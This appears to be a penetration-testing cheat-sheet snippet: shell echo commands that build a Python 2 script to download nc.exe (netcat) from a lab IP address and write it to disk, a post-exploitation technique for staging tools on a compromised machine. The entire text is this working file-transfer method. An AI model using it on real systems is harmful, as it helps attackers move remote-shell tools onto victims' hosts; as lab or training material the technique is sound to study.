echo '#!/usr/bin/python'  >python_dl.py
echo import urllib2  >>python_dl.py
echo 'u = urllib2.urlopen("http://10.11.0.172/nc.exe")'  >>python_dl.py
echo 'localFile = open("download_via_python", "w")'  >>python_dl.py
echo 'localFile.write(u.read())'  >>python_dl.py
echo 'localFile.close()' >>python_dl.py
